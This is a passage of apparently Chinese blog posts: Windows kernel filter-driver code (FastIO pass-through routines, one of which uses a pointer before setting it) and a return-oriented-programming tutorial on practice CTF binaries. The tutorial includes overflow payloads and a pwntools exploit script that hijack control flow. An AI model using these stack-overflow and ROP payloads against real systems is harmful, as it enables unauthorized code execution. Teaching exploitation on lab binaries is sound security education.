v5-&gt;FastIoQueryStandardInfo = FastIoQueryStandardInfo; v5-&gt;FastIoLock = FastIoLock; v5-&gt;FastIoUnlockSingle = FastIoUnlockSingle; v5-&gt;FastIoUnlockAll = FastIoUnlockAll; v5-&gt;FastIoUnlockAllByKey = FastIoUnlockAllByKey; v5-&gt;FastIoDeviceControl = FastIoDeviceControl; v5-&gt;FastIoDetachDevice = FastIoDetachDevice; v5-&gt;FastIoQueryNetworkOpenInfo = FastIoQueryNetworkOpenInfo; v5-&gt;MdlRead = FastIoMdlRead; v5-&gt;MdlReadComplete = FastIoMdlReadComplete; v5-&gt;PrepareMdlWrite = FastIoPrepareMdlWrite; v5-&gt;MdlWriteComplete = FastIoMdlWriteComplete; v5-&gt;FastIoReadCompressed = FastIoReadCompressed; v5-&gt;FastIoWriteCompressed = FastIoWriteCompressed; v5-&gt;MdlReadCompleteCompressed = FastIoMdlReadCompleteCompressed; v5-&gt;MdlWriteCompleteCompressed = FastIoMdlWriteCompleteCompressed; v5-&gt;FastIoQueryOpen = FastIoQueryOpen; *FastIoDispatch = v5; return 0;&#125; FastIO派遣例程成员首先判断设备对象是否是我们的设备对象，且不对控制设备对象处理。调用绑定的对应函数，这里自身直接返回FALSE。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859BOOLEAN FastIoCheckIfPossible( PFILE_OBJECT FileObject, PLARGE_INTEGER FileOffset, ULONG Length, BOOLEAN Wait, ULONG LockKey, BOOLEAN CheckForReadOperation, PIO_STATUS_BLOCK IoStatus, PDEVICE_OBJECT DeviceObject)&#123; BOOLEAN IsOk = FALSE; PDEVICE_EXTENSION DeviceExtension = NULL; PFAST_IO_DISPATCH FastIoDispatch = NULL; //指针数组的数组名 PDEVICE_OBJECT v2 = NULL; //???????????????????????????????????????????? //判断设备对象是否是我们的设备对象 if (!IsOurDeviceObject(DeviceObject)) &#123; goto Exit; &#125; //我们要获得钩子函数 DeviceExtension = (PDEVICE_EXTENSION)DeviceObject-&gt;DeviceExtension; v2 = DeviceExtension-&gt;pFSDeviceObject; //FSD设备对象 if (IsControlDeviceObject(DeviceObject) == TRUE) &#123; goto Exit; //如果是控制设备对象 &#125; if(FastIoDispatch-&gt;FastIoCheckIfPossible == NULL) &#123; goto Exit; &#125; if (v2 == NULL || v2-&gt;DriverObject == NULL) &#123; goto Exit; &#125; FastIoDispatch = v2-&gt;DriverObject-&gt;FastIoDispatch; if (FastIoDispatch == NULL) &#123; goto Exit; &#125; IsOk = FastIoDispatch-&gt;FastIoCheckIfPossible( FileObject, FileOffset, Length, Wait, LockKey, CheckForReadOperation, IoStatus, v2);Exit: return IsOk; //如果返回false报废当前FastIo请求 执行Irp请求&#125; 可以抽出FastIO开始和结束部分 12345678910111213141516171819202122232425#define BEGIN_FAST_IO \\ PDEVICE_EXTENSION DeviceExtension = NULL; \\ PDEVICE_OBJECT v2 = NULL; \\ PFAST_IO_DISPATCH FastIoDispatch = NULL; \\ BOOLEAN IsOk = FALSE; \\ \\ if (!IsOurDeviceObject(DeviceObject)) \\ goto Exit; \\ \\ DeviceExtension = (PDEVICE_EXTENSION)DeviceObject-&gt;DeviceExtension; \\ v2 = DeviceExtension-&gt;pFSDeviceObject; \\ \\ if (IsControlDeviceObject(DeviceObject) == TRUE) \\ goto Exit; \\ \\ if (v2 == NULL || v2-&gt;DriverObject == NULL) \\ goto Exit; \\ \\ FastIoDispatch = v2-&gt;DriverObject-&gt;FastIoDispatch; \\ if (FastIoDispatch == NULL) \\ goto Exit; \\#define END_FAST_IO \\Exit: \\ return IsOk; \\ 给出余下的FastIO派遣例程 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507BOOLEAN FastIoRead( PFILE_OBJECT FileObject, PLARGE_INTEGER FileOffset, ULONG Length, BOOLEAN Wait, ULONG LockKey, PVOID Buffer, PIO_STATUS_BLOCK IoStatus, PDEVICE_OBJECT DeviceObject)&#123; BEGIN_FAST_IO if (FastIoDispatch-&gt;FastIoRead == NULL) goto Exit; IsOk = FastIoDispatch-&gt;FastIoRead( FileObject, FileOffset, Length, Wait, LockKey, Buffer, IoStatus, v2); END_FAST_IO&#125;BOOLEAN FastIoWrite( PFILE_OBJECT FileObject, PLARGE_INTEGER FileOffset, ULONG Length, BOOLEAN Wait, ULONG LockKey, PVOID Buffer, PIO_STATUS_BLOCK IoStatus, PDEVICE_OBJECT DeviceObject)&#123; BEGIN_FAST_IO if (FastIoDispatch-&gt;FastIoWrite == NULL) goto Exit; IsOk = FastIoDispatch-&gt;FastIoWrite( FileObject, FileOffset, Length, Wait, LockKey, Buffer, IoStatus, v2); END_FAST_IO&#125;/////////////////////////////////////////////////////////////////////////////BOOLEAN FastIoQueryBasicInfo( PFILE_OBJECT FileObject, BOOLEAN Wait, PFILE_BASIC_INFORMATION Buffer, PIO_STATUS_BLOCK IoStatus, PDEVICE_OBJECT DeviceObject)&#123; BEGIN_FAST_IO if (FastIoDispatch-&gt;FastIoQueryBasicInfo == NULL) goto Exit; IsOk = FastIoDispatch-&gt;FastIoQueryBasicInfo( FileObject, Wait, Buffer, IoStatus, v2); END_FAST_IO&#125;/////////////////////////////////////////////////////////////////////////////BOOLEAN FastIoQueryStandardInfo( PFILE_OBJECT FileObject, BOOLEAN Wait, PFILE_STANDARD_INFORMATION Buffer, PIO_STATUS_BLOCK IoStatus, PDEVICE_OBJECT DeviceObject)&#123; BEGIN_FAST_IO if (FastIoDispatch-&gt;FastIoQueryStandardInfo == NULL) goto Exit; IsOk = FastIoDispatch-&gt;FastIoQueryStandardInfo( FileObject, Wait, Buffer, IoStatus, v2); END_FAST_IO;&#125;/////////////////////////////////////////////////////////////////////////////BOOLEAN FastIoLock( PFILE_OBJECT FileObject, PLARGE_INTEGER FileOffset, PLARGE_INTEGER Length, PEPROCESS ProcessId, ULONG Key, BOOLEAN FailImmediately, BOOLEAN ExclusiveLock, PIO_STATUS_BLOCK IoStatus, PDEVICE_OBJECT DeviceObject)&#123; BEGIN_FAST_IO if (FastIoDispatch-&gt;FastIoLock == NULL) goto Exit; IsOk = FastIoDispatch-&gt;FastIoLock( FileObject, FileOffset, Length, ProcessId, Key, FailImmediately, ExclusiveLock, IoStatus, v2); END_FAST_IO&#125;/////////////////////////////////////////////////////////////////////////////BOOLEAN FastIoUnlockSingle( PFILE_OBJECT FileObject, PLARGE_INTEGER FileOffset, PLARGE_INTEGER Length, PEPROCESS ProcessId, ULONG Key, PIO_STATUS_BLOCK IoStatus, PDEVICE_OBJECT DeviceObject)&#123; BEGIN_FAST_IO if (FastIoDispatch-&gt;FastIoUnlockSingle == NULL) goto Exit; IsOk = FastIoDispatch-&gt;FastIoUnlockSingle( FileObject, FileOffset, Length, ProcessId, Key, IoStatus, v2); END_FAST_IO&#125;/////////////////////////////////////////////////////////////////////////////BOOLEAN FastIoUnlockAll( PFILE_OBJECT FileObject, PEPROCESS ProcessId, PIO_STATUS_BLOCK IoStatus, PDEVICE_OBJECT DeviceObject)&#123; BEGIN_FAST_IO if (FastIoDispatch-&gt;FastIoUnlockAll == NULL) goto Exit; IsOk = FastIoDispatch-&gt;FastIoUnlockAll( FileObject, ProcessId, IoStatus, v2); END_FAST_IO&#125;/////////////////////////////////////////////////////////////////////////////BOOLEAN FastIoUnlockAllByKey( PFILE_OBJECT FileObject, PVOID ProcessId, ULONG Key, PIO_STATUS_BLOCK IoStatus, PDEVICE_OBJECT DeviceObject)&#123; BEGIN_FAST_IO if (FastIoDispatch-&gt;FastIoUnlockAllByKey == NULL) goto Exit; IsOk = FastIoDispatch-&gt;FastIoUnlockAllByKey( FileObject, ProcessId, Key, IoStatus, v2); END_FAST_IO&#125;/////////////////////////////////////////////////////////////////////////////BOOLEAN FastIoDeviceControl( PFILE_OBJECT FileObject, BOOLEAN Wait, PVOID InputBuffer, ULONG InputBufferLength, PVOID OutputBuffer, ULONG OutputBufferLength, ULONG IoControlCode, PIO_STATUS_BLOCK IoStatus, PDEVICE_OBJECT DeviceObject)&#123; BEGIN_FAST_IO if (FastIoDispatch-&gt;FastIoDeviceControl == NULL) goto Exit; IsOk = FastIoDispatch-&gt;FastIoDeviceControl( FileObject, Wait, InputBuffer, InputBufferLength, OutputBuffer, OutputBufferLength, IoControlCode, IoStatus, v2); END_FAST_IO&#125;/////////////////////////////////////////////////////////////////////////////BOOLEAN FastIoQueryNetworkOpenInfo( PFILE_OBJECT FileObject, BOOLEAN Wait, PFILE_NETWORK_OPEN_INFORMATION Buffer, PIO_STATUS_BLOCK IoStatus, PDEVICE_OBJECT DeviceObject)&#123; BEGIN_FAST_IO if (FastIoDispatch-&gt;FastIoQueryNetworkOpenInfo == NULL) goto Exit; IsOk = FastIoDispatch-&gt;FastIoQueryNetworkOpenInfo( FileObject, Wait, Buffer, IoStatus, v2); END_FAST_IO&#125;/////////////////////////////////////////////////////////////////////////////BOOLEAN FastIoMdlRead( PFILE_OBJECT FileObject, PLARGE_INTEGER FileOffset, ULONG Length, ULONG LockKey, PMDL* MdlChain, PIO_STATUS_BLOCK IoStatus, PDEVICE_OBJECT DeviceObject)&#123; BEGIN_FAST_IO if (FastIoDispatch-&gt;MdlRead == NULL) goto Exit; IsOk = FastIoDispatch-&gt;MdlRead( FileObject, FileOffset, Length, LockKey, MdlChain, IoStatus, v2); END_FAST_IO&#125;/////////////////////////////////////////////////////////////////////////////BOOLEAN FastIoMdlReadComplete( PFILE_OBJECT FileObject, PMDL MdlChain, PDEVICE_OBJECT DeviceObject)&#123; BEGIN_FAST_IO if (FastIoDispatch-&gt;MdlReadComplete == NULL) goto Exit; IsOk = FastIoDispatch-&gt;MdlReadComplete( FileObject, MdlChain, v2); END_FAST_IO&#125;/////////////////////////////////////////////////////////////////////////////BOOLEAN FastIoPrepareMdlWrite( PFILE_OBJECT FileObject, PLARGE_INTEGER FileOffset, ULONG Length, ULONG LockKey, PMDL* MdlChain, PIO_STATUS_BLOCK IoStatus, PDEVICE_OBJECT DeviceObject)&#123; BEGIN_FAST_IO if (FastIoDispatch-&gt;PrepareMdlWrite == NULL) goto Exit; IsOk = FastIoDispatch-&gt;PrepareMdlWrite( FileObject, FileOffset, Length, LockKey, MdlChain, IoStatus, v2); END_FAST_IO&#125;/////////////////////////////////////////////////////////////////////////////BOOLEAN FastIoMdlWriteComplete( PFILE_OBJECT FileObject, PLARGE_INTEGER FileOffset, PMDL MdlChain, PDEVICE_OBJECT DeviceObject)&#123; BEGIN_FAST_IO if (FastIoDispatch-&gt;MdlWriteComplete == NULL) goto Exit; IsOk = FastIoDispatch-&gt;MdlWriteComplete( FileObject, FileOffset, MdlChain, v2); END_FAST_IO&#125;/////////////////////////////////////////////////////////////////////////////BOOLEAN FastIoReadCompressed( PFILE_OBJECT FileObject, PLARGE_INTEGER FileOffset, ULONG Length, ULONG LockKey, PVOID Buffer, PMDL* MdlChain, PIO_STATUS_BLOCK IoStatus, struct _COMPRESSED_DATA_INFO* CompressedDataInfo, ULONG CompressedDataInfoLength, PDEVICE_OBJECT DeviceObject)&#123; BEGIN_FAST_IO if (FastIoDispatch-&gt;FastIoReadCompressed == NULL) goto Exit; IsOk = FastIoDispatch-&gt;FastIoReadCompressed( FileObject, FileOffset, Length, LockKey, Buffer, MdlChain, IoStatus, CompressedDataInfo, CompressedDataInfoLength, v2); END_FAST_IO&#125;/////////////////////////////////////////////////////////////////////////////BOOLEAN FastIoWriteCompressed( PFILE_OBJECT FileObject, PLARGE_INTEGER FileOffset, ULONG Length, ULONG LockKey, PVOID Buffer, PMDL* MdlChain, PIO_STATUS_BLOCK IoStatus, struct _COMPRESSED_DATA_INFO* CompressedDataInfo, ULONG CompressedDataInfoLength, PDEVICE_OBJECT DeviceObject)&#123; BEGIN_FAST_IO if (FastIoDispatch-&gt;FastIoWriteCompressed == NULL) goto Exit; IsOk = FastIoDispatch-&gt;FastIoWriteCompressed( FileObject, FileOffset, Length, LockKey, Buffer, MdlChain, IoStatus, CompressedDataInfo, CompressedDataInfoLength, v2); END_FAST_IO&#125;/////////////////////////////////////////////////////////////////////////////BOOLEAN FastIoMdlReadCompleteCompressed( PFILE_OBJECT FileObject, PMDL MdlChain, PDEVICE_OBJECT DeviceObject)&#123; BEGIN_FAST_IO if (FastIoDispatch-&gt;MdlReadCompleteCompressed == NULL) goto Exit; IsOk = FastIoDispatch-&gt;MdlReadCompleteCompressed( FileObject, MdlChain, v2); END_FAST_IO&#125;/////////////////////////////////////////////////////////////////////////////BOOLEAN FastIoMdlWriteCompleteCompressed( PFILE_OBJECT FileObject, PLARGE_INTEGER FileOffset, PMDL MdlChain, PDEVICE_OBJECT DeviceObject)&#123; BEGIN_FAST_IO if (FastIoDispatch-&gt;MdlWriteCompleteCompressed == NULL) goto Exit; IsOk = FastIoDispatch-&gt;MdlWriteCompleteCompressed( FileObject, FileOffset, MdlChain, v2); END_FAST_IO&#125;/////////////////////////////////////////////////////////////////////////////BOOLEAN FastIoQueryOpen( PIRP Irp, PFILE_NETWORK_OPEN_INFORMATION NetworkInformation, PDEVICE_OBJECT DeviceObject)&#123; PIO_STACK_LOCATION IoStackLocation = IoGetCurrentIrpStackLocation(Irp); BEGIN_FAST_IO if (FastIoDispatch-&gt;FastIoQueryOpen == NULL) goto Exit; IoStackLocation-&gt;DeviceObject = v2; IsOk = FastIoDispatch-&gt;FastIoQueryOpen( Irp, NetworkInformation, v2); IoStackLocation-&gt;DeviceObject = DeviceObject; END_FAST_IO&#125;/////////////////////////////////////////////////////////////////////////////VOID FastIoDetachDevice( PDEVICE_OBJECT SourceDevice, PDEVICE_OBJECT TargetDevice)&#123; IoDetachDevice(TargetDevice); IoDeleteDevice(SourceDevice);&#125;","categories":[{"name":"Windows Kernel","slug":"Windows-Kernel","permalink":"https://qianmuoy.github.io/categories/Windows-Kernel/"}],"tags":[]},{"title":"从注册表获取驱动程序路径","slug":"从注册表获取驱动程序路径","date":"2024-03-09T12:30:14.000Z","updated":"2024-03-09T12:30:50.236Z","comments":true,"path":"2024/03/09/从注册表获取驱动程序路径/","link":"","permalink":"https://qianmuoy.github.io/2024/03/09/%E4%BB%8E%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%8E%B7%E5%8F%96%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8F%E8%B7%AF%E5%BE%84/","excerpt":"","text":"从注册表获取驱动程序路径123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990BOOLEAN LoadWorkPath() &#123; //驱动是由服务加载 KMD.exe NTSTATUS Status; OBJECT_ATTRIBUTES ObjectAttributes; HANDLE KeyHandle; KEY_VALUE_PARTIAL_INFORMATION* v5 = NULL; ULONG v7, ResultLength; UNICODE_STRING RegPath; UNICODE_STRING ValueName; UNICODE_STRING v10 = &#123; 0, 0, NULL &#125;; BOOLEAN IsOk = FALSE; ExAcquireFastMutex(&amp;__WorkPathLock); FreeWorkPath(); RtlInitUnicodeString(&amp;RegPath, REG_DRIVER_PATH); RtlInitUnicodeString(&amp;ValueName, REG_IMAGE_PATH); InitializeObjectAttributes(&amp;ObjectAttributes, &amp;RegPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL); Status = ZwOpenKey(&amp;KeyHandle, KEY_ALL_ACCESS, &amp;ObjectAttributes); if (Status != STATUS_SUCCESS) &#123; ExReleaseFastMutex(&amp;__WorkPathLock); return FALSE; &#125; Status = ZwQueryValueKey(KeyHandle, &amp;ValueName, KeyValuePartialInformation, NULL, 0, &amp;ResultLength); //获得内存大小 if (Status != STATUS_BUFFER_TOO_SMALL &amp;&amp; Status != STATUS_BUFFER_OVERFLOW) goto Exit; v7 = sizeof(KEY_VALUE_PARTIAL_INFORMATION) + ResultLength; //真正需要的内存大小 v5 = (KEY_VALUE_PARTIAL_INFORMATION*)AllocateBuffer(v7); if (v5 == NULL) goto Exit; //再次枚举数据 Status = ZwQueryValueKey(KeyHandle, &amp;ValueName, KeyValuePartialInformation, v5, v7, &amp;ResultLength); if (NT_SUCCESS(Status) == FALSE) goto Exit; v10.Buffer = (WCHAR*)AllocateBuffer(v5-&gt;DataLength + 2); if (v10.Buffer == NULL) goto Exit; //RtlZeroMemory(sTempWorkPath.Buffer, pKeyInfo-&gt;DataLength + 2); memcpy(v10.Buffer, v5-&gt;Data, v5-&gt;DataLength); /* kd&gt; db 0xfffffa80`61eef330fffffa80`61eef330 5c 00 3f 00 3f 00 5c 00-43 00 3a 00 5c 00 39 00 \\.?.?.\\.C.:.\\.9.fffffa80`61eef340 31 00 31 00 6b 00 69 00-73 00 6b 00 6e 00 6c 00 1.1.k.i.s.k.n.l.fffffa80`61eef350 36 00 34 00 5c 00 39 00-31 00 31 00 6b 00 69 00 6.4.\\.9.1.1.k.i.fffffa80`61eef360 73 00 6b 00 6e 00 6c 00-36 00 34 00 2e 00 73 00 s.k.n.l.6.4...s.fffffa80`61eef370 79 00 73 00 00 00 00 00-01 f3 ee 61 80 fa ff ff y.s.. */ RtlInitUnicodeString(&amp;__WorkPath, v10.Buffer); //__WorkPath 需要进行内存释放 IsOk = TRUE;Exit: ZwClose(KeyHandle); if (v5 != NULL) FreeBuffer(v5); if (IsOk == FALSE) &#123; if (v10.Buffer != NULL) FreeBuffer(v10.Buffer); __WorkPath.Buffer = NULL; &#125; else &#123; &#125; ExReleaseFastMutex(&amp;__WorkPathLock); return IsOk;&#125;","categories":[{"name":"Windows Kernel","slug":"Windows-Kernel","permalink":"https://qianmuoy.github.io/categories/Windows-Kernel/"}],"tags":[]},{"title":"创建控制设备对象与Ring3交互","slug":"创建控制设备对象与Ring3交互","date":"2024-03-01T08:47:13.000Z","updated":"2024-03-01T08:47:27.565Z","comments":true,"path":"2024/03/01/创建控制设备对象与Ring3交互/","link":"","permalink":"https://qianmuoy.github.io/2024/03/01/%E5%88%9B%E5%BB%BA%E6%8E%A7%E5%88%B6%E8%AE%BE%E5%A4%87%E5%AF%B9%E8%B1%A1%E4%B8%8ERing3%E4%BA%A4%E4%BA%92/","excerpt":"","text":"创建一个控制设备对象123456789101112131415161718192021222324252627282930313233343536373839404142434445//创建一个控制设备对象 (Ring3.exe交互)DEVICE_OBJECT* CreateDevice(WCHAR* DeviceName, WCHAR* LinkName, DRIVER_OBJECT* DriverObject, BOOLEAN IsDeviceExclusive)&#123; NTSTATUS Status; UNICODE_STRING v1; UNICODE_STRING v2; DEVICE_OBJECT* DeviceObject = NULL; //一维指针 PDEVICE_EXTENSION DeviceExtension; //设备扩展的指针 ???????????? RtlInitUnicodeString(&amp;v1, DeviceName); RtlInitUnicodeString(&amp;v2, LinkName); Status = IoCreateDevice( DriverObject, sizeof(DEVICE_EXTENSION), &amp;v1, FILE_DEVICE_UNKNOWN, 0, IsDeviceExclusive, &amp;DeviceObject); //二维指针 if (NT_SUCCESS(Status) == FALSE) &#123; return NULL; &#125; //设备扩展自定义的设备对象的私有数据 DeviceExtension = (PDEVICE_EXTENSION)DeviceObject-&gt;DeviceExtension; //系统分配出来的设备扩展 DeviceExtension-&gt;chDriver = &#x27;\\0&#x27;; DeviceExtension-&gt;pFSDeviceObject = NULL; //不需要挂载到设备栈 DeviceExtension-&gt;DeviceType = MAIN_CTRL; DeviceObject-&gt;Flags |= DO_BUFFERED_IO; Status = IoCreateSymbolicLink(&amp;v2, &amp;v1); if (NT_SUCCESS(Status) == FALSE) &#123; IoDeleteDevice(DeviceObject); return NULL; &#125; return DeviceObject;&#125;","categories":[{"name":"Windows Kernel","slug":"Windows-Kernel","permalink":"https://qianmuoy.github.io/categories/Windows-Kernel/"}],"tags":[]},{"title":"ROP技术实战","slug":"ROP技术实战","date":"2024-03-01T08:44:38.000Z","updated":"2024-03-01T08:45:10.547Z","comments":true,"path":"2024/03/01/ROP技术实战/","link":"","permalink":"https://qianmuoy.github.io/2024/03/01/ROP%E6%8A%80%E6%9C%AF%E5%AE%9E%E6%88%98/","excerpt":"","text":"ROP实战ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等） ROP是一种攻击技术，其中攻击者使用堆栈的控制来在现有程序代码中的子程序中的返回指令之前，立即间接地执行精心挑选的指令或机器指令组。 ret2win背景ROP的全称为Return-oriented programming（返回导向编程），这是一种高级的内存攻击技术可以用来绕过现代操作系统的各种通用防御（比如内存不可执行和代码签名等） ROP是一种攻击技术，其中攻击者使用堆栈的控制来在现有程序代码中的子程序中的返回指令之前，立即间接地执行精心挑选的指令或机器指令组。 因为所有执行的指令来自原始程序内的可执行存储器区域，所以这避免了直接代码注入的麻烦，并绕过了用来阻止来自用户控制的存储器的指令的执行的大多数安全措施。 因此，ROP技术是可以用来绕过现有的程序内部内存的保护机制的。 ROP要完成的任务包括要完成的任务包括：在内存中确定某段指令的地址，并用其覆盖返回地址。有时目标函数在内存内无法找到，有时目标操作并没有特定的函数可以完美适配，此时就需要在内存中寻找多个指令片段，拼凑出一系列操作来达成目的。假如要执行某段指令（我们将其称为“gadget”，意为小工具），溢出数据应该以下面的方式构造： payload : padding + address of gadget 上图是包括单个gadget的溢出 如果想连续执行若干段指令，就需要每个 gadget 执行完毕可以将控制权交给下一个 gadget。所以 gadget 的最后一步应该是 RET 指令，这样程序的控制权（eip）才能得到切换，所以这种技术被称为返回导向编程( Return OrientedProgramming )。要执行多个 gadget，溢出数据应该以下面的方式构造： payload : padding + address of gadget 1 +address of gadget 2 + …… + address of gadget n 在这样的构造下，被调用函数返回时会跳转执行 gadget 1，执行完毕时 gadget 1 的 RET 指令会将此时的栈顶数据（也就是 gadget 2 的地址）弹出至 eip，程序继续跳转执行gadget 2，以此类推。 上图是包含多个gadget的溢出数据 现在任务可以分解为：针对程序栈溢出所要实现的效果，找到若干段以 ret 作为结束的指令片段，按照上述的构造将它们的地址填充到溢出数据中。所以我们要解决以下几个问题。 首先，栈溢出之后要实现什么效果？ ROP 常见的拼凑效果是实现一次系统调用，Linux系统下对应的汇编指令是int 0x80。执行这条指令时，被调用函数的编号应存入 eax，调用参数应按顺序存入ebx，ecx，edx，esi，edi 中。例如，编号125对应函数 mprotect (void *addr, size_t len, int prot) 可用该函数将栈的属性改为可执行，这样就可以使用 shellcode 了。假如我们想利用系统调用执行这个函数，eax、ebx、ecx、edx 应该分别为“125”、内存栈的分段地址（可以通过调试工具确定）、“0x10000”（需要修改的空间长度，也许需要更长）、“7”（RWX 权限）。 其次，如何寻找对应的指令片段？ 有若干开源工具可以实现搜索以ret 结尾的指令片段，著名的包括ROPgadget、rp++、ropeme 等，甚至也可以用 grep 等文本匹配工具在汇编指令中搜索 ret 再进一步筛选。 最后，如何传入系统调用的参数？ 对于上面提到的mprotect 函数，我们需要将参数传输至寄存器，所以可以用 pop 指令将栈顶数据弹入寄存器。如果在内存中能找到直接可用的数据，也可以用 mov 指令来进行传输，不过写入数据再 pop 要比先搜索再 mov 来的简单，对吧？如果要用 pop 指令来传输调用参数，就需要在溢出数据内包含这些参数，所以上面的溢出数据格式需要一点修改。对于单个 gadget，pop 所传输的数据应该在gadget 地址之后，如下图所示。 上图是以gadget“pop eax; ret;”为例 在调用 mprotect()为栈开启可执行权限之后，我们希望执行一段 shellcode，所以要将 shellcode 也加入溢出数据，并将 shellcode 的开始地址加到 int 0x80 的 gadget之后。我们可以使用 push esp 这个 gadget。 我们假设现在内存中可以找到如下几条指令： 1234567891011pop eax; ret; # pop stack top into eaxpop ebx; ret; # pop stack top into ebxpop ecx; ret; # pop stack top into ecxpop edx; ret; # pop stack top into edxint 0x80; ret; # system callpush esp; ret; # push address of shellcode 对于所有包含 pop 指令的 gadget，在其地址之后都要添加 pop 的传输数据，同时在所有 gadget 最后包含一段 shellcode，最终溢出数据结构应该变为如下格式。 payload : padding + address of gadget 1 +param for gadget 1 + address of gadget 2 + param for gadget 2 + …… + addressof gadget n + shellcode 此处为了简单，先假定输入溢出数据不受“\\x00”字符的影响，所以 payload 可以直接包含 “\\x7d\\x00\\x00\\x00”（传给 eax 的参数125）。如果希望实现更为真实的操作，可以用多个 gadget 通过运算得到上述参数。比如可以通过下面三条 gadget 来给 eax 传递参数。 12345pop eax; ret; # pop stack top 0x1111118e into eaxpop ebx; ret; # pop stack top 0x11111111 into ebxsub eax, ebx; ret; # eax -= ebx 解决完上述问题，我们就可以拼接出溢出数据，输入至程序来为程序调用栈开启可执行权限并执行 shellcode。 出于简单化考虑，我们假设了所有需要的 gadget 的存在。在实际搜索及拼接 gadget 时，并不会像上面一样顺利，有两个方面需要注意。 第一，很多时候并不能一次凑齐全部的理想指令片段，这时就要通过数据地址的偏移、寄存器之间的数据传输等方法来“曲线救国”。举个例子，假设找不到下面这条 gadget 1pop ebx; ret; 但假如可以找到下面的gadget 1mov ebx, eax; ret; 我们就可以将它和 1pop eax; ret; 组合起来实现将数据传输给ebx 的功能。上面提到的用多个gadget 避免输入“\\x00”也是一个实例应用。 第二，要小心 gadget 是否会破坏前面各个 gadget 已经实现的部分，比如可能修改某个已经写入数值的寄存器。另外，要特别小心gadget 对 ebp 和 esp 的操作，因为它们的变化会改变返回地址的位置，进而使后续的 gadget 无法执行。 ret2win运行程序测试一下 radare2是一个开源的逆向工程和二进制分析框架，包括反汇编、分析数据、打补丁、比较数据、搜索、替换、虚拟化等等，同时具备超强的脚本加载能力，它可以运行在几乎所有主流的平台（GNU&#x2F;Linux, .Windows *BSD, iOS, OSX, Solaris…）并且支持很多的cpu架构以及文件格式。 radare2工程是由一系列的组件构成，这些组件可以在 radare2 界面或者单独被使用–比如我们将要在接下来实验中使用到的rahash2, rabin2, ragg2三个组件，所有这些组件赋予了 radare2 强大的静态以及动态分析、十六进制编辑以及溢出漏洞挖掘的能力。 使用r2进行分析，输入aaaa进行分析，然后afl列出所有函数 在上图中我们注意到几个关键的函数，包括main,pwnme,ret2win，我们使用pdf分别反汇编 我们注意到在ret2win函数中会打印flag.txt，也就是我们需要实现的目的 从上图中可以看到我们需要跳转的内存地址，以便执行上面打印flag的代码，地址为0x00400811 接下来我们需要知道覆盖指令指针所需的偏移量，在64位中需要关注RIP，可以使用gdb调试得到偏移。先使用q退出 随机创建长度为200的字符串，pattern_create 200 输入r并填入字符，发现程序终止，报SIGSEGV 接下来用pattern_search寻找偏移量 在64位程序中，我们先看RIP，发现它不包含我们前面随机生成的序列。在64位环境下，指针无法到达高地址，即不能超过0x00007fffffffffff，所以不能直接利用查看$eip的方法。但因为ret指令，相当于pop rsp，所以只要看一下rsp的值，就知道跳转的地址，从而知道溢出点。为了访问这些地址值，可以从 RSP 寄存器中获取它们。 可以看到，段错误时RSP的值为“AA0AAFAAb” 使用pattern offset查找偏移 现在我们已经知道了覆盖RIP所需的padding（40），以及要跳转的地址（0x00400811） 所需exp的关键就是”\\x90”*40 +”\\x11\\x08\\x40\\x00\\x00\\x00\\x00\\x00\\x00” 使用python简单地验证下 1python -c &#x27;print &quot;\\x90&quot;*40 +&quot;\\x11\\x08\\x40\\x00\\x00\\x00\\x00\\x00\\x00&quot;&#x27; | ./ret2win 或者写一个python脚本 123456789101112131415161718from pwn import *# Set up pwntools to work with this binaryelf = context.binary = ELF(&#x27;ret2win&#x27;)# Print out the target addressinfo(&quot;%#x target&quot;, elf.symbols.ret2win)# Send the payloadio = process(elf.path)ret2win = p64(elf.symbols.ret2win)payload = &quot;A&quot;*40 + ret2winio.sendline(payload)io.recvuntil(&quot;Here&#x27;s your flag:&quot;)# Get our flag!flag = io.recvline()success(flag) split先使用file、checksec等命令看一下文件的基本信息。或rabin2 -I 可以看到nx enabled，即开启了NX，也就是栈不可执行 先载入r2分析 r2 -AAA .&#x2F;split 使用afl列出所有函数 看到了三个可能是比较重要的函数 main：开始分析的地方 pwnme,usefulfunction:提示的这么明显了 先反汇编main pdf @ main 在上图中注意到其调用了pwnme 所以我们顺着分析pwnme 同样反汇编 pdf @ sym.pwnme 从上图可以看到有一个32字节的缓冲区，可以通过fgets接收96字节的输入从而溢出，也是和上一题ret2win一样溢出rip吗？ 我们先使用gdb 分析，往input中写入随机100字节序列 将input作为输入运行 然后pattern_search 可以看到溢出rsp需要40个字节，我们可以尝试通过调用其他函数吗，比如usefulfunction? 我们回到r2反汇编usefulfunction r2 -AAA .&#x2F;split 我们可以看到它调用将执行&#x2F;bin&#x2F;ls的system()函数。 usefulFunction函数的地址是0x00400807，所以我们需要40个字节的随机数据和这个地址。 简单的使用python生成exp写入input 1python2 -c &#x27;from pwn import *;print(&quot;A&quot; * 40 +p64(0x00400807))&#x27; &gt; input 在gdb中运行测试 可以看到成功执行了&#x2F;bin&#x2F;ls 不过我们的目标是打印flag，而不是ls，所以继续研究下去 回到r2中使用izz列出字符串 可以打印flag的字符串 这个字符串的地址是0x0001060 现在我们尝试溢出栈，直接执行到system() 